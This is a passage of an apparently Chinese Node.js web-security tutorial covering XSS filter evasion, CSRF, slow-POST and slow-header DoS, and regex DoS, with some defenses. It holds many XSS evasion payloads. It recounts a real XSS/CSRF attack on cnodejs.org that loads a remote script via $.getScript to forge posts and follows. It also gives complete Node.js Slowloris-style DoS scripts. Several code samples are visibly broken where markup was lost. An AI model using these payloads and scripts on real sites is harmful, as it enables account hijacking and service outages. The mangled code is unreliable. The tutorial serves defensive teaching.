+<p>如果PHP程序员已经转义了尖括号还有单双引号&#8221;&#8216;，那么上面的恶意代码会被漂亮的变成如下字符输出到留言内容中:</p>
+<p>$(&#8216;div:first&#8217;).html(&#8216;&lt;script&gt; alert(&#8220;xss&#8221;)&lt;/script&gt; &#8216;);<br />
+这里我们需要表扬一下PHP程序员，可以将一些常规的XSS注入都屏蔽掉，但是在utf-8编码中，字符还有另一种表示方式，那就是unicode码，我们把上面的恶意字符串改写成如下：</p>
+<p>$(&#8216;div:first&#8217;).html(&#8216;</p>
+<div>\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e</div>
+<p>&#8216;);<br />
+大家发现还是输出了alert框，只是这次需要将写好的恶意代码放入转码工具中做下转义，webqq曾经就爆出过上面这种unicode码的XSS注入漏洞，另外有很多反射型XSS漏洞因为过滤了单双引号，所以必须使用这种方式进行注入。</p>
+<p>?base64注入<br />
+除了比较老的ie6、7浏览器，一般浏览器在加载一些图片资源的时候我们可以使用base64编码显示指定图片，比如下面这段base64编码：</p>
+<p><img alt="" src="image/png;base64,iVBORw0KGgoAAAANSUhEU (... 省略若干字符) AAAASUVORK5CYII=" /><br />
+表示的就是一张Node.js官网的logo，图片如下：</p>
+<p>我们一般使用这样的技术把一些网站常用的logo或者小图标转存成为base64编码，进而减少一次客户端向服务器的请求，加快用户加载页面速度。</p>
+<p>我们还可以把HTML页面的代码隐藏在data属性之中，比如下面的代码将打开一个hello world的新页面。</p>
+<p>&lt;a href=&#8221;data:text/html;ascii,hello world&#8221;&gt;click me<br />
+根据这样的特性，我们就可以尝试把一些恶意的代码转存成为base64编码格式，然后注入到a标签里去，从而形成反射型XSS漏洞，我们编码如下代码。</p>
+<p><img alt="" src="x" /><br />
+经过base64编码之后的恶意代码如下。</p>
+<p><a href="text/html;base64, PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==">base64 xss</a><br />
+用户在点击这个超链接之后，就会执行如上的恶意alert弹窗，就算网站开发者过滤了单双引号&#8221;,&#8217;和左右尖括号，注入还是能够生效的。</p>
+<p>不过这样的注入因为跨域的问题，恶意脚本是无法获取网站的cookie值。另外如果网站提供我们自定义flash路径，也是可以使用相同的方式进行注入的，下面是一段规范的在网页中插入flash的代码：</p>
+<p>把data属性改写成如下恶意内容，也能够通过base64编码进行注入攻击：</p>
+<p>alert(&#8220;Hello&#8221;);<br />
+经过编码过后的注入内容：</p>
+<p>用户在打开页面后，会弹出alert框，但是在chrome浏览器中是无法获取到用户cookie的值，因为chrome会认为这个操作不安全而禁止它，看来我们的浏览器为用户安全也做了不少的考虑。</p>
+<p>?常用注入方式<br />
+注入的根本目的就是要HTML标签溢出，从而执行攻击者的恶意代码，下面是一些常用攻击手段：</p>
+<p>（1）alert(String.fromCharCode(88,83,83))，通过获取字母的ascii码来规避单双引号，这样就算网站过滤掉单双引号也还是可以成功注入的。</p>
+<p>（2）<img alt="" />，通过注入img标签来达到攻击的目的，这个只对ie6和ie7下有效，意义不大。</p>
+<p>（3）<img alt="" />，如果能成功闭合img标签的src属性，那么加上onload或者onerror事件可以更简单的让用户遭受攻击。</p>
+<p>（4）<img alt="" src="&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29" />，这种方式也只有对ie6奏效。</p>
+<p>（5）<img alt="" src="alert('XSS');" />，<img alt="" />，<img alt="" src="alert('XSS');" />，我们也可以把关键字Javascript分开写，避开一些简单的验证，这种方式ie6统统中招，所以ie6真不是安全的浏览器。</p>
+<p>（6），通过样式表也能注入。</p>
+<p>（7）@im\port&#8217;\ja\vasc\ript:alert(&#8220;XSS&#8221;)&#8217;;,如果可以自定义style样式，也可能被注入。</p>
+<p>（8），iframe的标签也可能被注入。</p>
+<p>（9）<a href="javasc&amp;NewLine;ript&amp;colon;alert(1)">click</a>，利用&amp;NewLine;伪装换行，&amp;colon;伪装冒号，从而避开对Javascript关键字以及冒号的过滤。</p>
+<p>其实XSS注入过程充满智慧，只要你反复尝试各种技巧，就可能在网站的某处攻击成功。总之，发挥你的想象力去注入吧，最后别忘了提醒下站长哦。更多XSS注入方式参阅：(XSS Filter Evasion Cheat Sheet)[https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet]</p>
+<p>?防范措施<br />
+对于防范XSS注入，其实只有两个字过滤，一定要对用户提交上来的数据保持怀疑，过滤掉其中可能注入的字符，这样才能保证应用的安全。另外，对于入库时过滤还是读库时过滤，这就需要根据应用的类型来进行选择了。下面是一个简单的过滤HTML标签的函数代码：</p>
+<p>var escape = function(html){<br />
+return String(html)<br />
+.replace(/&amp;(?!\w+;)/g, &#8216;&amp;&#8217;)<br />
+.replace(//g, &#8216;&gt;&#8217;)<br />
+.replace(/&#8221;/g, &#8216;&#8221;&#8216;)<br />
+.replace(/&#8217;/g, &#8221;&#8217;);<br />
+};<br />
+不过上述的过滤方法会把所有HTML标签都转义，如果我们的网站应用确实有自定义HMTL标签的需求的话，它就力不从心了。这里我推荐一个过滤XSS注入的模块，由本书另一位作者老雷提供：js-xss</p>
+<p>?CSRF请求伪造<br />
+CSRF是什么呢？CSRF全名是Cross-site request forgery，是一种对网站的恶意利用，CSRF比XSS更具危险性。</p>
+<p>?Session详解<br />
+想要深入理解CSRF攻击的特性，我们必须了解网站session的工作原理。</p>
+<p>session我想大家都不会陌生，无论你用Node.js或PHP开发过网站的肯定都用过session对象，假如我把浏览器的cookie禁用了，大家认为session还能正常工作吗？</p>
+<p>答案是否定的，我举个简单的例子来帮助大家理解session的含义。</p>
+<p>比如我办了一张超市的储值会员卡，我能享受部分商品打折的优惠，我的个人资料以及卡内余额都是保存在超市会员数据库里的。每次结账时，出示会员卡超市便能知道我的身份，随即进行打折优惠并扣除卡内相应余额。</p>
+<p>这里我们的会员卡卡号就相当于保存在cookie中的sessionid，而我的个人信息就是保存在服务端的session对象，因为cookie有两个重要特性，（1）同源性，保证了cookie不会跨域发送造成泄密；（2）附带性，保证每次请求服务端都会在请求头中带上cookie信息。也就是这两个特性为我们识别用户带来的便利，因为HTTP协议是无状态的，我们之所以知道请求用户的身份，其实就是获取了用户请求头中的cookie信息。</p>
+<p>当然session对象的保存方法多种多样，可以保存在文件中，也可以是内存里。考虑到分布式的横向扩展，我们还是建议生产环境把它保存在第三方媒介中，比如redis或者mongodb，默认的express框架是将session对象保存在内存里的。</p>
+<p>除了用cookie保存sessionid，我们还可以使用url参数来保存sessionid，只不过每次请求都需要在url里带上这个参数，根据这个参数，我们就能识别此次请求的用户身份了。</p>
+<p>另外近阶段利用Etag来保存sessionid也被使用在用户行为跟踪上，Etag是静态资源服务器对用户请求头中if-none-match的响应，一般我们第一次请求某一个静态资源是不会带上任何关于缓存信息的请求头的，这时候静态资源服务器根据此资源的大小和最终修改时间，哈希计算出一个字符串作为Etag的值响应给客户端，如下图：</p>
+<p>第二次当我们再访问这个静态资源的时候，由于本地浏览器具有此图片的缓存，但是不确定服务器是否已经更新掉了这个静态资源，所以在发起请求的时候会带上if-none-match参数，其值就是上次请求服务器响应的Etag值。服务器接收到这个if-none-match的值，再根据原算法去生成Etag值，进行比对。如果两个值相同，则说明该静态资源没有被更新，于是响应状态码304，告诉浏览器放心的使用本地缓存，远程资源没有更新，结果如下图：</p>
+<p>当然如果远程资源有变动，则服务器会响应一份新的资源给浏览器，并且Etag的值也会不同。根据这样的一个特性，我们可以得出结论，在用户第一次请求某一个静态资源的时候我们响应给它一个全局唯一的Etag值，在用户不清空缓存的情况下，用户下次再请求到服务器，还是会带上同一个Etag值的，于是我们可以利用这个值作为sessionid，而我们在服务器端保存这些Etag值和用户信息的对应关系，也就可以利用Etag来标识出用户身份了。</p>
+<p>?CSRF的危害性<br />
+在我们理解了session的工作机制后，CSRF攻击也就很容易理解了。CSRF攻击就相当于恶意用户复制了我的会员卡，用我的会员卡享受购物的优惠折扣，更可以使用我购物卡里的余额购买他的东西！</p>
+<p>CSRF的危害性已经不言而喻了，恶意用户可以伪造某一个用户的身份给其好友发送垃圾信息，这些垃圾信息的超链接可能带有木马程序或者一些诈骗信息（比如借钱之类的）。如果发送的垃圾信息还带有蠕虫链接的话，接收到这些有害信息的好友一旦打开私信中的链接，就也成为了有害信息的散播者，这样数以万计的用户被窃取了资料、种植了木马。整个网站的应用就可能在短时间内瘫痪。</p>
+<p>MSN网站，曾经被一个美国的19岁小伙子Samy利用css的background漏洞几小时内让100多万用户成功的感染了他的蠕虫，虽然这个蠕虫并没有破坏整个应用，只是在每一个用户的签名后面都增加了一句“Samy 是我的偶像”，但是一旦这些漏洞被恶意用户利用，后果将不堪设想。同样的事情也曾经发生在新浪微博上。</p>
+<p>想要CSRF攻击成功，最简单的方式就是配合XSS注入，所以千万不要小看了XSS注入攻击带来的后果，不是alert一个对话框那么简单，XSS注入仅仅是第一步！</p>
+<p>?cnodejs官网攻击实例<br />
+本节将给大家带来一个真实的攻击案例，学习Node.js编程的爱好者们肯定都访问过cnodejs.org，早期cnodejs仅使用一个简单的Markdown编辑器作为发帖回复的工具并没有做任何限制，在编辑器过滤掉HTML标签之前，整个社区alert弹窗满天飞，下图就是修复这个漏洞之前的各种注入情况：</p>
+<p>先分析一下cnodejs被注入的原因，其实原理很简单，就是直接可以在文本编辑器里写入代码，比如：</p>
+<p>alert(&#8220;xss&#8221;)<br />
+如此光明正大的注入肯定会引起站长们的注意，于是站长关闭了markdown编辑器的HTML标签功能，强制过滤直接在编辑器中输入的HTML标签。</p>
+<p>cnodejs注入的风波暂时平息了，不过真的禁用了所有输入的HTML标签就安全了吗？我们打开cnodejs网站的发帖页面，发现编辑器其实还是可以插入超链接的，这个功能就是为了帮助开发者分享自己的web站点以及学习资料：</p>
+<p>一般web编辑器的超链接功能最有可能成为反射型XSS的注入点，下面是web编辑器通常采取的超链接功能实现的原理，根据用户填写的超链接地址，生成<a>标签：</a></p>
+<p><a href="用户填写的超链接地址">用户填写的超链接描述</a><br />
+通常我们可以通过下面两种方式注入<a>标签：</a></p>
+<p>（1）用户填写的超链接内容 = javascript:alert(&#8220;xss&#8221;);<br />
+（2）用户填写的超链接内容 = http://www.baidu.com#&#8221;onclick=&#8221;alert(&#8216;xss&#8217;)&#8221;<br />
+方法（1）是直接写入js代码，一般都会被禁用，因为服务端一般会验证url 地址的合法性，比如是否是http或者https开头的。</p>
+<p>方法（2）是利用服务端没有过滤双引号，从而截断<a>标签href属性，给这个<a>标签增加onclick事件,从而实现注入。</a></a></p>
+<p>很可惜，经过升级的cnodejs网站编辑器将双引号过滤，所以方法（2）已经行不通了。但是cnodejs并没有过滤单引号，单引号我们也是可以利用的，于是我们注入如下代码：</p>
+<p>我们伪造了一个标题为bbbb的超链接，然后在href属性里直接写入js代码alert，最后我们利用js的注释添加一个双引号结尾，企图尝试双引号是否转义。如果单引号也被转义我们还可以尝试使用String.fromCharCode();的方式来注入，上图href属性也可以改为：</p>
+<p><a href="eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41))">用户填写的超链接描述</a><br />
+下图就是XSS注入成功，<a>标签侧漏的图片：</a></p>
+<p>在进行一次简单的CSRF攻击之前，我们需要了解一般网站是如何防范CSRF的。</p>
+<p>网站通常在需要提交数据的地方埋入一个隐藏的input框，这个input框的name值可能是_csrf或者_input等，这个隐藏的input框就是用来抵御CSRF攻击的，如果攻击者引导用户在其他网站发起post请求提交表单时，会因为隐藏框的_csrf值不同而验证失败，这个_csrf值将会记录在session对象中，所以在其他恶意网站是无法获取到这个值的。</p>
+<p>但是当站点被XSS注入之后，隐藏框的防御CSRF功能将彻底失效。回到cnodejs站点，查看源码，我们看到网站作者把_csrf值放到闭包内，然后通过模版渲染直接输出，这样看上去可以防御注入的脚本直接获取_csrf的值，但是真的这样吗？我们看下面代码的运行截图：</p>
+<p>我们用Ajax请求本页地址，然后获取整个页面的文本，通过正则将_csrf的值匹配出来，拿到_csrf值后我们就可以为所欲为了，我们这次的攻击的目的有2个：</p>
+<p>（1）将我所发的这篇恶意主题置顶，要让更多的用户看到，想要帖子置顶，就必须让用户自动回复，但是如果一旦疯狂的自动回复，肯定会被管理员发现，将导致主题被删除或者引起其他受害者的注意。所以我构想了如下流程，先自动回复主题，然后自动删除回复的主题，这样就神不知鬼不觉了，用户也不会发现自己回复过了，管理员也不会在意，因为帖子并没有显示垃圾信息。</p>
+<p>（2）增加帐号snoopy的粉丝数，要让受害者关注snoopy这个帐号，我们只要直接伪造受害者请求，发送到关注帐号的接口地址即可，当然这也是在后台运行的。</p>
+<p>下面是我们需要用到的cnodejs站点HTTP接口地址：</p>
+<p>（1）发布回复<br />
+url地址：http://cnodejs.org/503cc6d5f767cc9a5120d351/reply<br />
+post数据：<br />
+r_content:顶起来，必须的<br />
+_csrf:Is5z5W5KmmKwlIAYV5UDly9F</p>
+<p>（2）删除回复<br />
+请求地址：http://cnodejs.org/reply/504ffd5d5aa28e094300fd3a/delete<br />
+post数据：<br />
+reply_id:504ffd5d5aa28e094300fd3a<br />
+_csrf:Is5z5W5KmmKwlIAYV5UDly9F</p>
+<p>（3）关注<br />
+请求地址： http://cnodejs.org/ user/follow<br />
+post数据：<br />
+follow_id: &#8217;4efc278525fa69ac690000f7&#8242;,//我在cnodejs网站的用户id<br />
+_csrf:Is5z5W5KmmKwlIAYV5UDly9F<br />
+接口我们都拿到了，然后就是构建攻击js脚本了，我们的js脚本攻击流程就是：</p>
+<p>（1）获取_csrf值</p>
+<p>（2）发布回复</p>
+<p>（3）删除回复</p>
+<p>（4）加关注</p>
+<p>（5）跳转到正常的地址（防止用户发现）</p>
+<p>最后我们将整个攻击脚本放在NAE上（现在NAE已经关闭了，当年是比较流行的一个部署Node.js的云平台），然后将攻击代码注入到<a>标签：</a></p>
+<p>javascript:$.getScript(&#8216;http://rrest.cnodejs.net/static/cnode_csrf.js&#8217;) //&#8221;id=&#8217;follow_btn&#8217;name=&#8217;http://rrest.cnodejs.net/static/cnode_csrf.js&#8217; onmousedown=&#8217;$.getScript(this.name)//&#8217;<br />
+这次的注入攻击chrome，firefox，ie7+等主流浏览器都无一幸免，下面是注入成功的截图：</p>
+<p>不一会就有许多网友中招了，我的关注信息记录多了不少：</p>
+<p>通过这次XSS和CSRF的联袂攻击，snoopy成为了cnodejs粉丝数最多的帐号。回顾整个流程，主要还是依靠XSS注入才完成了攻击，所以我们想要让站点更加安全，任何XSS可能的注入点都一定要牢牢把关，彻底过滤掉任何可能有风险的字符。</p>
+<p>另外值得一提的是cookie的劫持，恶意用户在XSS注入成功之后，一般会用document.cookie来获取用户站点的cookie值，从而伪造用户身份造成破坏。存储在浏览器端的cookie有一个非常重要的属性HttpOnly，当标识有HttpOnly属性的cookie，攻击者是无法通过js脚本document.cookie获取的，所以对于一般sessionid的存储我们都建议在写入客户端cookie时带上HttpOnly，express在写cookie带上HttpOnly属性的代码如下：</p>
+<p>res.cookie(&#8216;rememberme&#8217;, &#8217;1&#8242;, { expires: new Date(Date.now() + 900000), httpOnly: true });<br />
+?应用层DoS拒绝服务<br />
+本章将介绍在应用层面的DoS攻击，应用层一些很小的漏洞，就有可能被攻击者抓住从而造成整个系统瘫痪，包括上面提到的Node.js管道拒绝服务漏洞都是属于这类攻击。</p>
+<p>?应用层和网络层的DoS<br />
+最经典的网络层DoS就是SYN flood，它利用了tcp协议的设计缺陷，由于tcp协议的广泛使用，所以目前想要根治这个漏洞是不可能的。</p>
+<p>tcp的客户端和服务端想要建立连接需要经过三次握手的过程，它们分别是：</p>
+<p>（1）客户端向服务端发送SYN包</p>
+<p>（2）服务端向客户端发送SYN/ACK包</p>
+<p>（3）客户端向服务端发送ACK包</p>
+<p>攻击者首先使用大量肉鸡服务器并伪造源ip地址，向服务端发送SYN包，希望建立tcp连接，服务端就会正常的响应SYN/ACK包，等待客户端响应。攻击客户端并不会去响应这些SYN/ACK包，服务端判断客户端超时就会丢弃这个连接。如果这些攻击连接数量巨大，最终服务器就会因为等待和频繁处理这种半连接而失去对正常请求的响应，从而导致拒绝服务攻击成功。</p>
+<p>通常我们会依靠一些硬件的防火墙来减轻这类攻击带来的危害，网络层的DDoS攻击防御算法非常复杂，我们本节将讨论应用层的DoS攻击。</p>
+<p>应用层的DoS攻击伴随着一定的业务和web服务器的特性，所以攻击更加多样化。目前的商业硬件设备很难对其做到有效的防御，因此它的危害性绝对不比网络层的DDoS低。</p>
+<p>比如黑客在攻陷了几个流量比较大的网站之后，在网页中注入如下代码：</p>
+<p>这样每个访问这些网站的客户端都成了黑客攻击目标网站的帮手，如果被攻击的路径是一些需要大量I/O计算的接口的话，该目标网站将会很快失去响应，黑客DoS攻击成功。</p>
+<p>关注应用层的DoS往往需要从实际业务入手，找到可能被攻击的地方，做针对性的防御。</p>
+<p>?超大Buffer<br />
+在开发中总有这样的web接口，接收用户传递上来的json字符串，然后将其保存到数据库中，我们简单构建如下代码：</p>
+<p>var http = require(&#8216;http&#8217;);<br />
+http.createServer(function (req, res) {<br />
+if(req.url === &#8216;/json&#8217; &amp;&amp; req.method === &#8216;POST&#8217;){//获取用上传代码<br />
+var body = [];<br />
+req.on(&#8216;data&#8217;,function(chunk){<br />
+body.push(chunk);//获取buffer<br />
+})<br />
+req.on(&#8216;end&#8217;,function(){<br />
+body = Buffer.concat(body);<br />
+res.writeHead(200, {&#8216;Content-Type&#8217;: &#8216;text/plain&#8217;});<br />
+//db.save(body) 这里是数据库入库操作<br />
+res.end(&#8216;ok&#8217;);<br />
+})<br />
+}<br />
+}).listen(8124);<br />
+我们使用buffer数组，保存用户发送过来的数据，最后通过Buffer.concat将所有buffer连接起来，并插入到数据库。</p>
+<p>注意这部分代码：</p>
+<p>req.on(&#8216;data&#8217;,function(chunk){<br />
+body.push(chunk);//获取buffer<br />
+})<br />
+不能用下面简单的字符串拼接来代替，可能我收到的内容不是utf-8格式，另外从拼接性能上来说两者也不是一个数量级的，我们看如下测试：</p>
+<p>var buf = new Buffer(&#8216;nodejsv0.10.4&amp;nodejsv0.10.4&amp;nodejsv0.10.4&amp;nodejsv0.10.4&amp;&#8217;);<br />
+console.time(&#8216;string += buf&#8217;);<br />
+var s = &#8221;;<br />
+for(var i=0;i&lt;100000;i++){<br />
+s += buf;<br />
+}<br />
+s;<br />
+console.timeEnd(&#8216;string += buf&#8217;);</p>
+<p>console.time(&#8216;buf concat&#8217;);<br />
+var list = [];<br />
+var len=0;<br />
+for(var i=0;i=1024*1024){//每次收到一个buffer块都要比较一下是否超过1mb<br />
+res.end(&#8216;too large&#8217;);//直接响应错误<br />
+}<br />
+})<br />
+req.on(&#8216;end&#8217;,function(){<br />
+body = Buffer.concat(body,len);<br />
+res.writeHead(200, {&#8216;Content-Type&#8217;: &#8216;text/plain&#8217;});<br />
+//db.save(body) 这里数据库入库操作<br />
+res.end(&#8216;ok&#8217;);<br />
+})<br />
+}<br />
+}).listen(8124);<br />
+通过上述代码的调整，我们每次收到一个buffer块都会去比较一下大小，如果数据超大则立刻截断上传，保证恶意用户无法上传超大文件消耗服务器物理内存。</p>
+<p>?Slowlori攻击<br />
+POST慢速DoS攻击是在2010年OWASP大会上被披露的，这种攻击方式针对配置较低的服务器具有很强的威力，往往几台攻击客户端就可以轻松击垮一台web应用服务器。</p>
+<p>攻击者先向web应用服务器发起一个正常的POST请求，设定一个在web服务器限定范围内并且比较大的Content-Length，然后以非常慢的速度发送数据，比如30秒左右发送一次10byte的数据给服务器，保持这个连接不释放。因为客户端一直在向服务器发包，所以服务器也不会认为连接超时，这样服务器的一个tcp连接就一直被这样一个慢速的POST占用，极大的浪费了服务器资源。</p>
+<p>这个攻击可以针对任意一个web服务器进行，所以受众面非常广；而且此类攻击手段非常简单和廉价，一般一台普通的个人计算机就可以提供2-3千个tcp连接，所以只要同时有几台攻击机器，web服务器可能立刻就会因为连接数耗尽而拒绝服务。</p>
+<p>下面是一个Node.js版本的Slowlori攻击恶意脚本：</p>
+<p>var http = require(&#8216;http&#8217;);<br />
+var options = {<br />
+hostname: &#8217;127.0.0.1&#8242;,<br />
+port: 8124,<br />
+path: &#8216;/json&#8217;,<br />
+method: &#8216;POST&#8217;,<br />
+headers:{<br />
+&#8220;Content-Length&#8221;:1024*1024<br />
+}<br />
+};<br />
+var max_conn = 1000;<br />
+http.globalAgent.maxSockets = max_conn;//设定最大请求连接数<br />
+var reqArray = [];<br />
+var buf = new Buffer(1024);<br />
+buf.fill(&#8216;h&#8217;);<br />
+while(max_conn&#8211;){<br />
+var req = http.request(options, function(res) {<br />
+res.setEncoding(&#8216;utf8&#8242;);<br />
+res.on(&#8216;readable&#8217;, function () {<br />
+console.log(res.read());<br />
+});<br />
+});<br />
+reqArray.push(req);<br />
+}<br />
+setInterval(function(){//定时隔5秒发送一次<br />
+reqArray.forEach(function(v){<br />
+v.write(buf);<br />
+})<br />
+},1000*5);<br />
+由于Node.js的天生单线程优势，我们可以只写一个定时器，而不用像其他语言创建1000个线程，每个线程里面一个定时器在那里跑。有网友经过测试，发现慢POST攻击对Apache的效果十分明显，Apache的maxClients几乎在瞬间被锁住，客户端浏览器在攻击进行期间甚至无法访问测试页面。</p>
+<p>想要抵挡这类慢POST攻击，我们可以在Node.js应用前面放置一个靠谱的web服务器，比如Nginx，合理的配置可以有效的减轻这类攻击带来的影响。</p>
+<p>?Http Header攻击<br />
+一般web服务器都会设定HTTP请求头的接收时长，是指客户端在指定的时长内必须把HTTP的head发送完毕。如果web服务器在这方面没有做限制，我们也可以用同样的原理慢速的发送head数据包，造成服务器连接的浪费，下面是攻击脚本代码：</p>
+<p>var net = require(&#8216;net&#8217;);<br />
+var maxConn = 1000;<br />
+var head_str = &#8216;GET / HTTP/1.1\r\nHost: 192.168.17.55\r\n&#8217;<br />
+var clientArray = [];<br />
+while(maxConn&#8211;){<br />
+var client = net.connect({port: 8124, host:&#8217;192.168.17.55&#8242;});<br />
+client.write(head_str);<br />
+client.on(&#8216;error&#8217;,function(e){<br />
+console.log(e)<br />
+})<br />
+client.on(&#8216;end&#8217;,function(){<br />
+console.log(&#8216;end&#8217;)<br />
+})<br />
+clientArray.push(client);<br />
+}<br />
+setInterval(function(){//定时隔5秒发送一次<br />
+clientArray.forEach(function(v){<br />
+v.write(&#8216;xhead: gap\r\n&#8217;);<br />
+})<br />
+},1000*5);<br />
+这里定义了一个永远发不完的请求头，定时每5秒钟发送一个，类似慢POST攻击，我们慢慢悠悠的发送HTTP请求头，当连接数耗尽，服务器也就拒绝响应服务了。</p>
+<p>随着我们连接数增加，最终Node.js服务器可能会因为打开文件数过多而崩溃：</p>
+<p>/usr/local/nodejs/test/http_server.js:10<br />
+console.log(process.memoryUsage());<br />
+^<br />
+Error: EMFILE, too many open files<br />
+at null. (/usr/local/nodejs/test/http_server.js:10:22)<br />
+at wrapper [as _onTimeout] (timers.js:252:14)<br />
+at Timer.listOnTimeout [as ontimeout] (timers.js:110:15)<br />
+Node.js对用户HTTP的请求响应头做了大小限制，最大不能超过50KB，所以我无法向HTTP请求头里发送大量的数据从而造成服务器内存占用，如果web服务器没有做这个限制，我们可以利用POST发送大数据那样，将一个超大的HTTP头发送给服务器，恶意消耗服务器的内存。</p>
+<p>?正则表达式的DoS<br />
+日常使用判断用户输入是否合法的正则表达式，如果书写不够规范也可能成为恶意用户攻击的对象。</p>
+<p>正则表达式引擎NFA具有回溯性，回溯的一个重要负面影响是，虽然正则表达式可以相当快速地计算确定匹配（输入字符串与给定正则表达式匹配），但确认否定匹配（输入字符串与正则表达式不匹配）所需的时间会稍长。实际上，引擎必须确定输入字符串中没有任何可能的“路径”与正则表达式匹配才会认为否定匹配，这意味着引擎必须对所有路径进行测试。</p>
+<p>比如，我们使用下面的正则表达式来判断字符串是不是全部为数字：</p>
+<p>^\(d+)$<br />
+先简单解释一下这个正则表达式，^和$分别表示字符串的开头和结尾严格匹配，\d代表数字字符，+表示有一个或多个字符匹配，上面这个正则表达式表示必须是一个或多个数字开头并且以数字结尾的纯数字字符串。</p>
+<p>如果待匹配字符串全部为纯数字，那这是一个相当简单的匹配过程，下面我们使用字符串123456X作为待判断字符串来说明上述正则表达式的详细匹配过程。</p>
+<p>字符串123456X很明显不是匹配项，因为X不是数字字符。但上述正则表达式必须计算多少个路径才能得出此结论呢？从此字符串第一位开始计算，发现字符1是一个有效的数字字符，与此正则表达式匹配。然后它会移动到字符2，该字符也匹配。在此时，正则表达式与字符串12匹配。然后尝试3（匹配123），依次类推，一直到到达X，得出结论该字符不匹配。</p>
+<p>但是，由于正则表达式引擎的回溯性，它不会在此点上停止，而是从其当前的匹配123456返回到上一个已知的匹配12345，从那里再次尝试匹配。</p>
+<p>由于5后面的下一个字符不是此字符串的结尾，因此引擎认为不是匹配项，接着它会返回到其上一个已知的匹配1234，再次进行尝试匹配。按这种方式进行所有匹配，直到此引擎返回到其第一个字符1，发现1后面的字符不是字符串的结尾，此时，匹配停止。</p>
+<p>总的说来，此引擎计算了六个路径：123456、12345、1234、123、12 和1。如果此输入字符串再增加一个字符，则引擎会多计算一个路径。因此，此正则表达式是相对于字符串长度的线性算法，不存在导致DoS的风险。</p>
+<p>这类计算一般速度非常迅速，可以轻松拆分长度超过1万的字符串。但是，如果我们对此正则表达式进行细微的修改，情况可能大不相同：</p>
+<p>^(\d+)+$<br />
+分组表达式(\d+)后面有额外的+字符，表明此正则表达式引擎可匹配一个或多个的匹配组(\d+)。</p>
+<p>我们还是输入123456X字符串作为待匹配字符串，在匹配过程中，计算到达123456之后回溯到12345，此时引擎不仅会检查到5后面的下一个字符不是此字符串的结尾，而且还会将下一个字符6作为新的匹配组，并从那里重新开始检查，一旦此匹配失败，它会返回到1234，先将56作为单独的匹配组进行匹配，然后将5和6分别作为单独的匹配组进行计算，这样直到返回1为止。</p>
+<p>这样攻击者只要提供相对较短的输入字符串大约30 个字符左右，就可以让匹配所需时间大大增加，下面是相关测试代码：</p>
+<p>var regx = /^(\d+)$/;<br />
+var regx2 = /^(\d+)+$/;<br />
+var str = &#8217;1234567890123456789012345X&#8217;;<br />
+console.time(&#8216;^\(d+)$&#8217;);<br />
+regx.test(str);<br />
+console.timeEnd(&#8216;^\(d+)$&#8217;);<br />
+console.time(&#8216;^(\d+)+$&#8217;);<br />
+regx2.test(str);<br />
+console.timeEnd(&#8216;^(\d+)+$&#8217;);<br />
+我们用正则表达式^(\d+)$和^(\d+)+$分别对一个长度为26位的字符串进行匹配操作，执行结果如下：</p>
+<p>^(d+)$: 0ms<br />
+^(d+)+$: 866ms<br />
+如果我们继续增加待检测字符串的长度，那么匹配时间将成倍的延长，从而因为服务器cpu频繁计算而无暇处理其他任务，造成拒绝服务。下面是一些有问题的正则表达式示例：</p>
+<p>^(\d+)*$<br />
+^(\d*)*$<br />
+^(\d+|\s+)*$<br />
+当正则漏洞隐藏于一些比较长的正则表达式中时，可能更加难以发现：</p>
+<p>^([0-9a-zA-Z]([-.\w]*[0-9a-zA-Z])*@(([0-9a-zA-Z])+([-\w]*[0-9a-zA-Z])*\.)+[a-zA-Z]{2,9})$<br />
+上述正则表达式是在正则表达式库网站（regexlib.com）上找到的，我们可以通过如下代码进行简单的测试：</p>
+<p>var regx = /^([0-9a-zA-Z]([-.\w]*[0-9a-zA-Z])*@(([0-9a-zA-Z])+([-\w]*[0-9a-zA-Z])*\.)+[a-zA-Z]{2,9})$/;<br />
+var str1 = &#8217;123@1234567890.com&#8217;;<br />
+var str2 = &#8217;123@163&#8242;;//正常用户忘记输入.com了<br />
+var str3 = &#8217;123@1234567890123456789012345..com&#8217;;//恶意字符串<br />
+console.time(&#8216;str1&#8242;);<br />
+regx.test(str1);<br />
+console.timeEnd(&#8216;str1&#8242;);<br />
+console.time(&#8216;str2&#8242;);<br />
+regx.test(str2);<br />
+console.timeEnd(&#8216;str2&#8242;);<br />
+console.time(&#8216;str3&#8242;);<br />
+regx.test(str3);<br />
+console.timeEnd(&#8216;str3&#8242;);<br />
+我们执行上述代码，结果如下：</p>
+<p>str1: 0ms<br />
+str2: 0ms<br />
+str3: 1909ms<br />
+输入正确、正常错误和恶意代码的执行结果区别很大，如果我们恶意代码不断加长，最终将导致服务器拒绝服务，上述这个正则表达式的漏洞之处就在于它企图通过使用对分组后再进行+符号的匹配，它原来的目的是为验证多级域名下的合法邮箱地址，例如：abc@aaa.bbb.ccc.gmail.com，没想到却成为了漏洞。</p>
+<p>正则表达式的DoS不仅仅局限于Node.js语言，使用任何一门语言进行开发都需要面临这个问题，当然在使用正则来编写express框架的路由时尤其需要注意，一个不好的正则路由匹配可能会被恶意用户DoS攻击，总之在使用正则表达式时我们应该多留一个心眼，仔细检查它们是否足够强壮，避免被DoS攻击。</p>
+<p>?文件路径漏洞<br />
+文件路径漏洞也是非常致命的，常常伴随着被恶意用户挂木马或者代码泄漏，由于Node.js提供的HTTP模块非常的底层，所以很多工作需要开发者自己来完成，可能因为业务比较简单，不去使用成熟的框架，在写代码时稍不注意就会带来安全隐患。</p>
+<p>本章将会通过制作一个网络分享的网站，说明文件路径攻击的两种方式。</p>
+<p>?上传文件漏洞<br />
+文件上传功能在网站上是很常见的，现在假设我们提供一个网盘分享服务，用户可以上传待分享的文件，所有用户上传的文件都存放在/file文件夹下。其他用户通过浏览器访问&#8217;/list&#8217;看到大家分享的文件。</p>
+<p>首先，我们要启动一个HTTP服务器，为用户访问根目录/提供一个可以上传文件的静态页面。</p>
